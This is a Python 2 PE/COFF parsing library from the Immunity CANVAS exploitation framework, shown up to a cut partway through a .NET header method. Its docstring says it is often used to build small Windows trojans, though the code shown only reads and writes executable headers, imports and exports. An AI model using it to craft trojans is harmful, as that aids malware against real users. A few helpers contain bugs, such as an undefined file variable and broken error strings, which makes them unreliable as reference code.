#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


"""
pelib.py - a useful library for ripping into and creating
PECOFF files (used by Windows)

This library is often used to create little Windows trojans
via MOSDEF

Useful URLS:
http://research.microsoft.com/invisible/include/loaders/pe_image.h.htm
http://www.codeproject.com/useritems/inject2it.asp#Figure5
http://www003.upp.so-net.ne.jp/kish/prog/apihook.html
http://nezumi-lab.org/blog/?p=178
"""

import struct, sys
if "." not in sys.path: sys.path.append(".")


import mosdef
from shellcode import shellcodeGenerator
from exploitutils import binstring
from internal.debug import devlog

import binascii
import random

IMAGE_SIZEOF_FILE_HEADER=20
MZ_MAGIC = 0x5A4D
PE_MAGIC = 0x4550
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
IMAGE_ORDINAL_FLAG = 0x80000000L

# PE documentation:
# http://win32assembly.online.fr/files/pe1.zip

def hexdump(buf):
    tbl=[]
    tmp=""
    hex=""
    i=0
    for a in buf:
        hex+="%02X "% ord(a)
        i+=1
        if ord(a) >=0x20 and ord(a) <0x7f:
            tmp+=a
        else:
            tmp+="."
        if i%16 == 0:
            tbl.append((hex, tmp))
            hex=""
            tmp=""
    tbl.append((hex, tmp))
    return tbl

def readStringFromFile(fd, offset):
    idx= fd.tell()
    fd.seek(offset)
    b=f.read(4096*4)
    zero=b.find("\0")
    fd.seek(idx)
    if zero > -1:
        return b[:zero]
    #return ""

#typedef struct _IMAGE_DOS_HEADER {  // DOS .EXE header
    #USHORT e_magic;         // Magic number
    #USHORT e_cblp;          // Bytes on last page of file
    #USHORT e_cp;            // Pages in file
    #USHORT e_crlc;          // Relocations
    #USHORT e_cparhdr;       // Size of header in paragraphs
    #USHORT e_minalloc;      // Minimum extra paragraphs needed
    #USHORT e_maxalloc;      // Maximum extra paragraphs needed
    #USHORT e_ss;            // Initial (relative) SS value
    #USHORT e_sp;            // Initial SP value
    #USHORT e_csum;          // Checksum
    #USHORT e_ip;            // Initial IP value
    #USHORT e_cs;            // Initial (relative) CS value
    #USHORT e_lfarlc;        // File address of relocation table
    #USHORT e_ovno;          // Overlay number
    #USHORT e_res[4];        // Reserved words
    #USHORT e_oemid;         // OEM identifier (for e_oeminfo)
    #USHORT e_oeminfo;       // OEM information; e_oemid specific
    #USHORT e_res2[10];      // Reserved words
    #LONG   e_lfanew;        // File address of new exe header
    #} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

def encode_7bits(number):
    """
    encode a number in a 7bits form
    """

    output = ""
    while number > 0x80:
        output += chr(0x80 | (number & 0x7f))
        number >>= 7
    output += chr(number & 0x7f)

    return output

class PEError(Exception): pass

class MZ:

    def __init__(self):
        self.fmt="<30HL"
        self.e_magic=MZ_MAGIC
        self.e_cblp=self.e_cp=self.e_crlc=self.e_cparhdr=self.e_minalloc=self.e_maxalloc = self.e_ss = self.e_sp =\
            self.e_csum = self.e_ip= self.e_cs = self.e_lfarlc = self.e_ovno = self.e_oemid =\
            self.e_oeminfo = self.e_res2 =self.e_lfanew = 0

        self.e_res = [0,0,0,0]
        self.e_res2 = [0,0,0,0,0,0,0,0,0,0]

    def getSize(self):
        return struct.calcsize(self.fmt)

    def get(self, data):
        try:
            buf=struct.unpack(self.fmt, data[:struct.calcsize(self.fmt)])
        except struct.error:
            raise PEError, "The header doesn't correspond to a MZ header"

        self.e_magic    = buf[0]
        self.e_cblp     = buf[1]
        self.e_cp       = buf[2]
        self.e_crlc     = buf[3]
        self.e_cparhdr  = buf[4]
        self.e_minalloc = buf[5]
        self.e_maxalloc = buf[6]
        self.e_ss       = buf[7]
        self.e_sp       = buf[8]
        self.e_csum     = buf[9]
        self.e_ip       = buf[10]
        self.e_cs       = buf[11]
        self.e_lfarlc   = buf[12]
        self.e_ovno     = buf[13]
        self.e_res      = buf[14:18]
        self.e_oemid    = buf[18]
        self.e_oeminfo  = buf[19]
        self.e_res2     = buf[20:30]
        self.e_lfanew   = buf[30]

        if self.e_magic != MZ_MAGIC:
            raise PEError, "The header doesn't correspond to a MZ header"
        return 

    def raw(self):
        return struct.pack(self.fmt, self.e_magic, self.e_cblp, self.e_cp,\
                           self.e_crlc, self.e_cparhdr, self.e_minalloc,\
                           self.e_maxalloc, self.e_ss, self.e_sp, self.e_csum,\
                           self.e_ip, self.e_cs, self.e_lfarlc, self.e_ovno, \
                           self.e_res[0],self.e_res[1],self.e_res[2],self.e_res[3],\
                           self.e_oemid, self.e_oeminfo,\
                           self.e_res2[0], self.e_res2[1], self.e_res2[2], self.e_res2[3],\
                           self.e_res2[4], self.e_res2[5], self.e_res2[6], self.e_res2[7],
                           self.e_res2[8], self.e_res2[9], self.e_lfanew)

    # returns the e_lfanew offset
    def getPEOffset(self):
        return self.e_lfanew

class ImageImportByName:
    def __init__(self):
        self.fmt = "<H"
        self.Hint=0
        self.Name=""

    def __str__(self):
        return "%s: %s"%(self.Name, self.Hint)

    def get(self, data):
        self.Hint = struct.unpack(self.fmt, data[:2])[0]
        ndx = data[2:].find("\0")
        if ndx == -1:
            raise PEError, "No string found on ImageImportByName"
        self.Name = data[2:2+ndx]

    def getSize(self):
        size=len(self.Name) +3 # 1 for \0 + 2 for Hint
        if size % 2:
            size+=1 #Padding
        return size

    def raw(self):
        raw=struct.pack(self.fmt, self.Hint) + self.Name + "\0"
        if len(raw) % 2:
            raw+="\0" #padding
        return raw

class ImportDescriptor:
    def __init__(self):
        self.fmt= "<LLLLL"
        self.OriginalFirstThunk= self.TimeDateStamp= self.ForwarderChain= self.Name=\
            self.FirstThunk=0
        self.sName =""
        self.Imports={}

    def get(self, data):
        (self.OriginalFirstThunk, self.TimeDateStamp, self.ForwarderChain, self.Name,\
         self.FirstThunk) = struct.unpack(self.fmt, data)

    def setSname(self, name):
        self.sName= name

    def setImport(self, name, obj):
        self.Imports[name] = obj

    def raw(self):
        return struct.pack(self.fmt, self.OriginalFirstThunk, self.TimeDateStamp, self.ForwarderChain, self.Name,\
                           self.FirstThunk)

    def getSize(self):
        return struct.calcsize(self.fmt)

#typedef struct _IMAGE_DATA_DIRECTORY {
#    ULONG   VirtualAddress;
#    ULONG   Size;
#} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;


class Directory:

    def __init__(self):
        self.VirtualAddress = self.Size = 0

    def get(self, data):
        (self.VirtualAddress, self.Size) = struct.unpack("<2L", data)

    def raw(self):
        return struct.pack("<2L", self.VirtualAddress, self.Size)

    def getSize(self):
        return 0x8

#typedef struct _IMAGE_EXPORT_DIRECTORY {
#    DWORD   Characteristics;
#    DWORD   TimeDateStamp;
#    WORD    MajorVersion;
#    WORD    MinorVersion;
#    DWORD   Name;
#    DWORD   Base;
#    DWORD   NumberOfFunctions;
#    DWORD   NumberOfNames;
#    DWORD   AddressOfFunctions;     // RVA from base of image
#    DWORD   AddressOfNames;         // RVA from base of image
#    DWORD   AddressOfNameOrdinals;  // RVA from base of image
#} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY
class ImageExportDirectory:
    def __init__(self):
        self.fmt = "<2L2H7L"
        self.Characteristics = self.TimeDateStamp = self.MajorVersion = self.MinorVersion = self.Name = self.Base=\
            self.NumberOfFunctions = self.NumberOfNames = self.AddressOfFunctions = self.AddressOfNames = \
            self.AddressOfNameOrdinals = 0
        self.sName=""

    def setName(self, name):
        self.sName = name                

    def getSize(self):
        return struct.calcsize(self.fmt)

    def get(self, data):
        (self.Characteristics, self.TimeDateStamp, self.MajorVersion, self.MinorVersion, self.Name, self.Base,\
         self.NumberOfFunctions, self.NumberOfNames, self.AddressOfFunctions, self.AddressOfNames, \
         self.AddressOfNameOrdinals) = struct.unpack(self.fmt, data)

    def raw(self):
        return struct.pack(self.fmt, self.Characteristics, self.TimeDateStamp, self.MajorVersion, self.MinorVersion, self.Name, self.Base,\
                           self.NumberOfFunctions, self.NumberOfNames, self.AddressOfFunctions, self.AddressOfNames, \
                           self.AddressOfNameOrdinals)



#define IMAGE_SIZEOF_SHORT_NAME              8
#
#typedef struct _IMAGE_SECTION_HEADER {
#    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
#    union {
#            DWORD   PhysicalAddress;
#            DWORD   VirtualSize;
#    } Misc;umber
#    DWORD   VirtualAddress;
#    DWORD   SizeOfRawData;
#    DWORD   PointerToRawData;
#    DWORD   PointerToRelocations;
#    DWORD   PointerToLinenumbers;
#    WORD    NumberOfRelocations;
#    WORD    NumberOfLinenumbers;
#    DWORD   Characteristics;
#} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

class Section:
    def __init__(self):
        self.fmt="<LLLLLLHHL"
        self.Name=""
        self.VirtualSize = self.VirtualAddress = self.SizeOfRawData = self.PointerToRawData =\
            self.PointerToRelocations = self.PointerToLinenumbers=\
            self.NumberOfRelocations = self.NumberOfLinenumbers =\
            self.Characteristics = 0

    def getSize(self):
        return struct.calcsize(self.fmt) + 8

    def has(self, rva, imagebase=0):
        return rva >= (self.VirtualAddress+imagebase) and rva < (self.VirtualAddress+self.VirtualSize+imagebase)

    def hasOffset(self, offset):
        return offset >= self.PointerToRawData and offset < (self.PointerToRawData + self.VirtualSize)

    def get(self, data):
        idx=0

        self.Name=data[idx:idx+8]
        idx+=8

        (self.VirtualSize, self.VirtualAddress, self.SizeOfRawData, self.PointerToRawData ,\
         self.PointerToRelocations, self.PointerToLinenumbers,\
         self.NumberOfRelocations, self.NumberOfLinenumbers,\
         self.Characteristics)= \
         struct.unpack(self.fmt, data[idx:])

    def raw(self):
        self.Name = (self.Name + "\x00" * (8-len(self.Name)))[:8]
        return self.Name + struct.pack(self.fmt, self.VirtualSize, \
                                       self.VirtualAddress, self.SizeOfRawData, self.PointerToRawData,\
                                       self.PointerToRelocations, self.PointerToLinenumbers,\
                                       self.NumberOfRelocations, self.NumberOfLinenumbers,\
                                       self.Characteristics)                   



#typedef struct _IMAGE_FILE_HEADER {
#        USHORT  Machine;
#        USHORT  NumberOfSections;
#        ULONG   TimeDateStamp;
#        ULONG   PointerToSymbolTable;
#        ULONG   NumberOfSymbols;
#        USHORT  SizeOfOptionalHeader;
#        USHORT  Characteristics;
#} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

##define IMAGE_SIZEOF_FILE_HEADER             20
class IMGhdr:
    def __init__(self, win64=0):
        self.win64=win64
        self.imagefmt= "<2H3L2H"
        if self.win64 == 1:
            (self.Machine,\
             self.NumberOfSections,\
             self.TimeDateStamp,\
             self.PointerToSymbolTable,\
             self.NumberOfSymbols,\
             self.SizeOfOptionalHeader,\
             self.Characteristics)= (0,0,0,0,0,0xf0,0) #16 bytes larger than PE32
        else :
            (self.Machine,\
             self.NumberOfSections,\
             self.TimeDateStamp,\
             self.PointerToSymbolTable,\
             self.NumberOfSymbols,\
             self.SizeOfOptionalHeader,\
             self.Characteristics)= (0,0,0,0,0,0xe0,0)

    def get(self, data):
        try:
            (self.Machine,\
             self.NumberOfSections,\
             self.TimeDateStamp,\
             self.PointerToSymbolTable,\
             self.NumberOfSymbols,\
             self.SizeOfOptionalHeader,\
             self.Characteristics)=struct.unpack(self.imagefmt, data)
        except struct.error:
            raise PEError, "Invalid IMAGE header" % self.signature

    def getSize(self):
        return struct.calcsize(self.imagefmt)

    def raw(self):
        try:
            return struct.pack(self.imagefmt,self.Machine,\
                               self.NumberOfSections,\
                               self.TimeDateStamp,\
                               self.PointerToSymbolTable,\
                               self.NumberOfSymbols,\
                               self.SizeOfOptionalHeader,\
                               self.Characteristics)
        except struct.error:
            raise PEError, "Image not initialized" % self.signature


#typedef struct _IMAGE_OPTIONAL_HEADER {
#    //
#    // Standard fields.
#    //
#    USHORT  Magic;
#    UCHAR   MajorLinkerVersion;
#    UCHAR   MinorLinkerVersion;
#    ULONG   SizeOfCode;
#    ULONG   SizeOfInitializedData;
#    ULONG   SizeOfUninitializedData;
#    ULONG   AddressOfEntryPoint;
#    ULONG   BaseOfCode;
##ifndef PE32+
#    ULONG   BaseOfData; //Doesnt exist in PE32+
##endif
#    //
#    // NT additional fields.
#    //
#    ULONG   ImageBase;
#    ULONG   SectionAlignment;
#    ULONG   FileAlignment;
#    USHORT  MajorOperatingSystemVersion;
#    USHORT  MinorOperatingSystemVersion;
#    USHORT  MajorImageVersion;
#    USHORT  MinorImageVersion;
#    USHORT  MajorSubsystemVersion;
#    USHORT  MinorSubsystemVersion;
#    ULONG   Reserved1;
#    ULONG   SizeOfImage;
#    ULONG   SizeOfHeaders;
#    ULONG   CheckSum;
#    USHORT  Subsystem; //1: native, 2:Windows/GUI, 3:Windows/Non-GUI 5:OS/2 7:Posix
#    USHORT  DllCharacteristics;
#    ULONG   SizeOfStackReserve;
#    ULONG   SizeOfStackCommit;
#    ULONG   SizeOfHeapReserve;
#    ULONG   SizeOfHeapCommit;
#    ULONG   LoaderFlags;
#    ULONG   NumberOfRvaAndSizes;
#    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
#} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;

class IMGOPThdr:
    def __init__(self, win64=0):
        self.win64=win64
        self.MajorLinkerVersion = self.MinorLinkerVersion = self.SizeOfCode =\
            self.SizeOfInitializedData = self.SizeOfUninitializedData = self.AddressOfEntryPoint =\
            self.BaseOfCode = self.BaseOfData = self.ImageBase = self.SectionAlignment = self.FileAlignment =\
            self.MajorOperatingSystemVersion = self.MinorOperatingSystemVersion = self.MajorImageVersion =\
            self.MinorImageVersion = self.MajorSubsystemVersion = self.MinorSubsystemVersion =\
            self.Reserved1 = self.SizeOfImage = self.SizeOfHeaders = self.CheckSum = self.Subsystem =\
            self.DllCharacteristics = self.SizeOfStackReserve = self.SizeOfStackCommit = self.SizeOfHeapReserve=\
            self.SizeOfHeapCommit = self.LoaderFlags = self.NumberOfRvaAndSizes  =0 

        #test
        self.MajorImageVersion=1
        self.MinorImageVersion=0

        if self.win64 == 1:
            self.optionalfmt="<HBB5LQLL6H4L2H4QLL"
            #Changed to x64 magic
            self.Magic=0x020b
            self.allfields = (self.Magic,\
                              self.MajorLinkerVersion,\
                              self.MinorLinkerVersion,\
                              self.SizeOfCode,\
                              self.SizeOfInitializedData,\
                              self.SizeOfUninitializedData,\
                              self.AddressOfEntryPoint,\
                              self.BaseOfCode,\
                              self.ImageBase,\
                              self.SectionAlignment,\
                              self.FileAlignment,\
                              self.MajorOperatingSystemVersion,\
                              self.MinorOperatingSystemVersion,\
                              self.MajorImageVersion,\
                              self.MinorImageVersion,\
                              self.MajorSubsystemVersion,\
                              self.MinorSubsystemVersion,\
                              self.Reserved1,\
                              self.SizeOfImage,\
                              self.SizeOfHeaders,\
                              self.CheckSum,\
                              self.Subsystem,\
                              self.DllCharacteristics,\
                              self.SizeOfStackReserve,\
                              self.SizeOfStackCommit,\
                              self.SizeOfHeapReserve,\
                              self.SizeOfHeapCommit,\
                              self.LoaderFlags,\
                              self.NumberOfRvaAndSizes )
        else:
            self.optionalfmt="<HBB9L6H4L2H6L"
            self.Magic=0x010b
            self.allfields = (self.Magic,\
                              self.MajorLinkerVersion,\
                              self.MinorLinkerVersion,\
                              self.SizeOfCode,\
                              self.SizeOfInitializedData,\
                              self.SizeOfUninitializedData,\
                              self.AddressOfEntryPoint,\
                              self.BaseOfCode,\
                              self.BaseOfData,\
                              self.ImageBase,\
                              self.SectionAlignment,\
                              self.FileAlignment,\
                              self.MajorOperatingSystemVersion,\
                              self.MinorOperatingSystemVersion,\
                              self.MajorImageVersion,\
                              self.MinorImageVersion,\
                              self.MajorSubsystemVersion,\
                              self.MinorSubsystemVersion,\
                              self.Reserved1,\
                              self.SizeOfImage,\
                              self.SizeOfHeaders,\
                              self.CheckSum,\
                              self.Subsystem,\
                              self.DllCharacteristics,\
                              self.SizeOfStackReserve,\
                              self.SizeOfStackCommit,\
                              self.SizeOfHeapReserve,\
                              self.SizeOfHeapCommit,\
                              self.LoaderFlags,\
                              self.NumberOfRvaAndSizes )


    def getSize(self):
        return struct.calcsize(self.optionalfmt)

    def Print(self):
        if self.win64 == 1:
            return "self.Magic %08x,\
                   self.MajorLinkerVersion %08x,\
                   self.MinorLinkerVersion %08x,\
                   self.SizeOfCode %08x,\
                   self.SizeOfInitializedData %08x,\
                   self.SizeOfUninitializedData %08x,\
                   self.AddressOfEntryPoint %08x,\
                   self.BaseOfCode %08x,\
                   self.ImageBase %16x,\
                   self.SectionAlignment %08x,\
                   self.FileAlignment %08x,\
                   self.MajorOperatingSystemVersion %08x,\
                   self.MinorOperatingSystemVersion %08x,\
                   self.MajorImageVersion %08x,\
                   self.MinorImageVersion %08x,\
                   self.MajorSubsystemVersion %08x,\
                   self.MinorSubsystemVersion %08x,\
                   self.Reserved1 %08x,\
                   self.SizeOfImage %08x,\
                   self.SizeOfHeaders %08x,\
                   self.CheckSum %08x,\
                   self.Subsystem %08x,\
                   self.DllCharacteristics %08x,\
                   self.SizeOfStackReserve %16x,\
                   self.SizeOfStackCommit %16x,\
                   self.SizeOfHeapReserve %16x,\
                   self.SizeOfHeapCommit %16x,\
                   self.LoaderFlags %08x,\
                   self.NumberOfRvaAndSizes %08x" % \
                                                  self.allfields

        else:
            return "self.Magic %08x,\
                   self.MajorLinkerVersion %08x,\
                   self.MinorLinkerVersion %08x,\
                   self.SizeOfCode %08x,\
                   self.SizeOfInitializedData %08x,\
                   self.SizeOfUninitializedData %08x,\
                   self.AddressOfEntryPoint %08x,\
                   self.BaseOfCode %08x,\
                   self.BaseOfData %08x,\
                   self.ImageBase %08x,\
                   self.SectionAlignment %08x,\
                   self.FileAlignment %08x,\
                   self.MajorOperatingSystemVersion %08x,\
                   self.MinorOperatingSystemVersion %08x,\
                   self.MajorImageVersion %08x,\
                   self.MinorImageVersion %08x,\
                   self.MajorSubsystemVersion %08x,\
                   self.MinorSubsystemVersion %08x,\
                   self.Reserved1 %08x,\
                   self.SizeOfImage %08x,\
                   self.SizeOfHeaders %08x,\
                   self.CheckSum %08x,\
                   self.Subsystem %08x,\
                   self.DllCharacteristics %08x,\
                   self.SizeOfStackReserve %08x,\
                   self.SizeOfStackCommit %08x,\
                   self.SizeOfHeapReserve %08x,\
                   self.SizeOfHeapCommit %08x,\
                   self.LoaderFlags %08x,\
                   self.NumberOfRvaAndSizes %08x" % \
                                                  self.allfields

    def get(self, data):    
        try:
            if self.win64 == 1:
                self.allfields = struct.unpack(self.optionalfmt, data)
                (self.Magic,
                 self.MajorLinkerVersion,
                 self.MinorLinkerVersion, \
                 self.SizeOfCode, \
                 self.SizeOfInitializedData, \
                 self.SizeOfUninitializedData, \
                 self.AddressOfEntryPoint, \
                 self.BaseOfCode, \
                 self.ImageBase, \
                 self.SectionAlignment, \
                 self.FileAlignment, \
                 self.MajorOperatingSystemVersion, \
                 self.MinorOperatingSystemVersion, \
                 self.MajorImageVersion, \
                 self.MinorImageVersion, \
                 self.MajorSubsystemVersion, \
                 self.MinorSubsystemVersion, \
                 self.Reserved1, \
                 self.SizeOfImage, \
                 self.SizeOfHeaders, \
                 self.CheckSum, \
                 self.Subsystem, \
                 self.DllCharacteristics, \
                 self.SizeOfStackReserve, \
                 self.SizeOfStackCommit, \
                 self.SizeOfHeapReserve, \
                 self.SizeOfHeapCommit, \
                 self.LoaderFlags, \
                 self.NumberOfRvaAndSizes) = self.allfields

            else:
                self.allfields = struct.unpack(self.optionalfmt, data)
                (self.Magic, \
                 self.MajorLinkerVersion, \
                 self.MinorLinkerVersion, \
                 self.SizeOfCode, \
                 self.SizeOfInitializedData, \
                 self.SizeOfUninitializedData, \
                 self.AddressOfEntryPoint, \
                 self.BaseOfCode, \
                 self.BaseOfData, \
                 self.ImageBase, \
                 self.SectionAlignment, \
                 self.FileAlignment, \
                 self.MajorOperatingSystemVersion, \
                 self.MinorOperatingSystemVersion, \
                 self.MajorImageVersion, \
                 self.MinorImageVersion, \
                 self.MajorSubsystemVersion, \
                 self.MinorSubsystemVersion, \
                 self.Reserved1, \
                 self.SizeOfImage, \
                 self.SizeOfHeaders, \
                 self.CheckSum, \
                 self.Subsystem, \
                 self.DllCharacteristics, \
                 self.SizeOfStackReserve, \
                 self.SizeOfStackCommit, \
                 self.SizeOfHeapReserve, \
                 self.SizeOfHeapCommit, \
                 self.LoaderFlags, \
                 self.NumberOfRvaAndSizes) = self.allfields

        except struct.error:
            raise PEError, "Invalid Optional Header" % self.signature

    def raw(self):
        try:
            if self.win64 == 1:
                return struct.pack(self.optionalfmt, self.Magic,\
                                   self.MajorLinkerVersion,\
                                   self.MinorLinkerVersion,\
                                   self.SizeOfCode,\
                                   self.SizeOfInitializedData,\
                                   self.SizeOfUninitializedData,\
                                   self.AddressOfEntryPoint,\
                                   self.BaseOfCode,\
                                   self.ImageBase,\
                                   self.SectionAlignment,\
                                   self.FileAlignment,\
                                   self.MajorOperatingSystemVersion,\
                                   self.MinorOperatingSystemVersion,\
                                   self.MajorImageVersion,\
                                   self.MinorImageVersion,\
                                   self.MajorSubsystemVersion,\
                                   self.MinorSubsystemVersion,\
                                   self.Reserved1,\
                                   self.SizeOfImage,\
                                   self.SizeOfHeaders,\
                                   self.CheckSum,\
                                   self.Subsystem,\
                                   self.DllCharacteristics,\
                                   self.SizeOfStackReserve,\
                                   self.SizeOfStackCommit,\
                                   self.SizeOfHeapReserve,\
                                   self.SizeOfHeapCommit,\
                                   self.LoaderFlags,\
                                   self.NumberOfRvaAndSizes )

            else:
                return struct.pack(self.optionalfmt, self.Magic,\
                                   self.MajorLinkerVersion,\
                                   self.MinorLinkerVersion,\
                                   self.SizeOfCode,\
                                   self.SizeOfInitializedData,\
                                   self.SizeOfUninitializedData,\
                                   self.AddressOfEntryPoint,\
                                   self.BaseOfCode,\
                                   self.BaseOfData,\
                                   self.ImageBase,\
                                   self.SectionAlignment,\
                                   self.FileAlignment,\
                                   self.MajorOperatingSystemVersion,\
                                   self.MinorOperatingSystemVersion,\
                                   self.MajorImageVersion,\
                                   self.MinorImageVersion,\
                                   self.MajorSubsystemVersion,\
                                   self.MinorSubsystemVersion,\
                                   self.Reserved1,\
                                   self.SizeOfImage,\
                                   self.SizeOfHeaders,\
                                   self.CheckSum,\
                                   self.Subsystem,\
                                   self.DllCharacteristics,\
                                   self.SizeOfStackReserve,\
                                   self.SizeOfStackCommit,\
                                   self.SizeOfHeapReserve,\
                                   self.SizeOfHeapCommit,\
                                   self.LoaderFlags,\
                                   self.NumberOfRvaAndSizes )

        except struct.error:
            raise PEError, "Invalid Optional Header" % self.signature

class PE:
    def __init__(self, win64=0):
        #IMAGE HEADER
        self.Directories=[]
        self.Sections={}
        self.Imports={} #dictionary of ImportDescriptors
        self.data=""
        self.win64=win64

    def get(self, data, offset2PE):
        self.data=data 
        self.offset2PE=offset2PE
        idx=self.offset2PE

        self.signature,=struct.unpack("<L", data[idx:idx+4])
        idx+=4

        if self.signature != PE_MAGIC:            
            raise PEError, "Invalid PE Signature: %08x" % self.signature

        self.IMGhdr = IMGhdr( win64=self.win64)
        self.IMGhdr.get(data[idx: idx+self.IMGhdr.getSize()])

        idx += self.IMGhdr.getSize()
        self.IMGOPThdr = IMGOPThdr( win64=self.win64)
        self.IMGOPThdr.get(data[idx:idx+self.IMGOPThdr.getSize()])
        idx += self.IMGOPThdr.getSize()


        self.getDirectories(data[idx: idx+IMAGE_NUMBEROF_DIRECTORY_ENTRIES*8])
        idx += IMAGE_NUMBEROF_DIRECTORY_ENTRIES*8

        #print "-" * 4 + " Directories "+ "-" * 4
        #self.printDirectories()

        idx += self.getSections(data[idx:])

        #print "-" * 4 + " Sections "+ "-" * 4
        #self.printSections()

        # Getting Imports
        #print "-" * 4 + " Imports "+ "-" * 4
        self.getImportDescriptor(data, self.Directories[1].VirtualAddress)
        #self.printImportDescriptor()

        #print "-" * 4 + " Exports "+ "-" * 4
        self.getExportDescriptor(data, self.Directories[0].VirtualAddress)

        #offset=self.getOffsetFromRVA(0x7aac)
        #print hexdump(data[offset:offset+0x10])
        #print self.IMGOPThdr.Print()
        return

    def getSections(self, data):
        idx = 0
        for a in range(0, self.IMGhdr.NumberOfSections):
            sec= Section()
            sec.get(data[idx:idx+sec.getSize()])
            idx+=sec.getSize()
            self.Sections[sec.Name] = sec

        return idx+ sec.getSize()

    def getSectionData(self, sectionname):
        section=self.Sections[sectionname]
        data=self.data[section.VirtualAddress:section.VirtualAddress+section.VirtualSize]
        return data

    def getImportDescriptor(self, data, rva):
        offset=self.getOffsetFromRVA(rva)
        if not offset: 
            print "No Import Table Found"
            return ""
        while 1:
            im = ImportDescriptor()

            im.get(data[offset:offset + im.getSize()])
            if im.OriginalFirstThunk == 0:
                break
            im.setSname(self.getString(data, im.Name))
            if not im.sName:
                raise PEError, "No String found on Import at offset: 0x%08x" % offset
            self.Imports[im.sName] = im
            count=0
            funcNdx= self.getOffsetFromRVA(im.OriginalFirstThunk)
            while 1:
                rva2IIBN= struct.unpack("<L", data[funcNdx:funcNdx+4])[0]
                #print "%s: rva2IIBN=%x"%(im.sName, rva2IIBN)
                funcNdx+=4
                if rva2IIBN == 0:
                    break
                iibn=ImageImportByName()
                iibn.funcNdx=funcNdx
                iibn.parent=im 
                if rva2IIBN & IMAGE_ORDINAL_FLAG:

                    im.setImport("#"+str(rva2IIBN & ~(IMAGE_ORDINAL_FLAG))\
                                 , iibn)
                else:
                    off2IIBN=self.getOffsetFromRVA(rva2IIBN)
                    iibn.get(data[off2IIBN:])
                    im.setImport(iibn.Name, iibn)                                                        
                    iibn.rva2IIBN=rva2IIBN
                    iibn.count=count
                count+=1
            offset+=im.getSize()
        return

    def getIAT(self, importdll, functionname):
        """
        Gets the IAT of a function
        or returns None
        """
        ntoskrnl=self.Imports.get(importdll)
        if not ntoskrnl:
            return None 
        keASST=ntoskrnl.Imports.get(functionname)
        if not keASST:
            return None 

        #print "keASST=%s"%keASST
        dwIAT=self.IMGOPThdr.ImageBase+ntoskrnl.FirstThunk
        dwIAT+=keASST.count*4
        #print "dwIAT: %x"%dwIAT
        return dwIAT

    def printImportDescriptor(self):
        """
        Print out all the functions we import and the DLL we
        import them from
        """

        for a in self.Imports.keys():
            #for each ImportDescriptor (DLL we import from)
            im = self.Imports[a] # to clarify a bit
            i=0

            for b in im.Imports.keys():
                c=im.Imports[b]
                #print out all the functions we import
                print "%s : %s: %x+%x"%(a,b, self.IMGOPThdr.ImageBase+im.FirstThunk,c.count)
                i+=1

    def printSections(self):
        print "Name   VirtualAddress  PointerToRawData"
        for a in self.Sections.keys():
            print a, hex(self.Sections[a].VirtualAddress), hex(self.Sections[a].PointerToRawData), hex(self.Sections[a].SizeOfRawData )


    def getString(self, data, rva):
        offset=self.getOffsetFromRVA(rva)
        end= data[offset:].find("\0")
        if end ==-1:
            return ""
        return data[offset:offset+end]

    def getInt(self, rva, data=None):
        """
        Returns an integer from our data
        """
        if data==None:
            data=self.data
        offset=self.getOffsetFromRVA(rva)
        return data[offset:offset+4]

    def getOffsetFromRVA(self, rva, imagebase=0):
        sec=None
        for a in self.Sections.keys():
            if self.Sections[a].has(rva, imagebase):
                sec=self.Sections[a]
        if sec:
            return  (rva -sec.VirtualAddress -imagebase )+ sec.PointerToRawData
        print "No offset found on rva: %x"%rva
        return ""

    def getRVAfromoffset(self, offset, imagebase=0):
        sec = None
        for a in self.Sections.keys():
            if self.Sections[a].hasOffset(offset):
                sec=self.Sections[a]
        if sec:
            return  (offset -sec.PointerToRawData)+ sec.VirtualAddress+imagebase
        return ""            

    def getDirectories(self, data):
        self.Directories=[]
        for a in range(0, IMAGE_NUMBEROF_DIRECTORY_ENTRIES):
            directory= Directory()
            directory.get(data[a*8 : a*8+8])
            self.Directories.append(directory)

    def printDirectories(self):
        for a in self.Directories:
            print "%08x %08x " % (a.VirtualAddress, a.Size)

    def getExportDescriptor(self,data,  rva):
        offset=self.getOffsetFromRVA(rva)
        if not offset: 
            #print "No Export Table Found"
            return ""            
        em = ImageExportDirectory()
        em.get(data[offset:offset+ em.getSize()])
        em.setName( self.getString(data, em.Name)) # We use the address at is it (No offset from rva)
        addrofnames   = self.getOffsetFromRVA(em.AddressOfNames)
        addroforidnal = self.getOffsetFromRVA(em.AddressOfNameOrdinals)
        eat = self.getOffsetFromRVA(em.AddressOfFunctions)

        for a in range(0, em.NumberOfNames):
            nameaddr = struct.unpack("<L", data[ addrofnames   : addrofnames+4 ])[0]
            ordinal  = struct.unpack("<H", data[ addroforidnal : addroforidnal+2 ])[0]
            address  = struct.unpack("<L", data[ eat +ordinal*4 : eat +ordinal*4+4 ])[0]

            try:
                name = self.getString(data, nameaddr)
            except TypeError, msg:
                print "Error on Export Table %s" % str(msg)
                break
            #print "0x%08x (0x%08x):  %s" % (self.IMGOPThdr.ImageBase + address, address, name) 
            addrofnames +=4
            addroforidnal+=2

class IMAGE_COR20_HEADER:
    def __init__(self):
        self.optionalfmt="<LHHLLLL2L2L2L2L2L2L"
        self.cb = self.MajorRuntimeVersion = self.MinorRuntimeVersion = self.MetaDataVA = self.MetaDataSize = self.Flags = \
            self.EntryPointToken = self.ResourcesVA = self.StrongNameSignatureVA = self.CodeManagerTableVA = \
            self.VTableFixupsVA = self.ExportAddressTableJumpsVA = self.ManagedNativeHeaderVA = self.ResourcesSize = \
            self.StrongNameSignatureSize = self.CodeManagerTableSize = self.VTableFixupsSize = self.ExportAddressTableJumpsSize = \
            self.ManagedNativeHeaderSize = 0

    def getSize(self):
        return struct.calcsize(self.optionalfmt)

    def Print(self):
        return None

    def get(self, data):    
        try:
